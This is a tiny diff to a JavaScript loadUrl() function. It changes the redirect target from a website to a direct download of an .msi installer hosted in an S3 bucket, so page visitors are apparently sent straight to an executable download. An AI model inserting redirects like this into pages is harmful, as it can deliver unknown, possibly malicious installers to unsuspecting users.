@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://www.djbzymm.com";
+		var url="https://gg622.s3.ap-southeast-2.amazonaws.com/HelloWorld.msi";
 		window.location=url;
 	}
 }
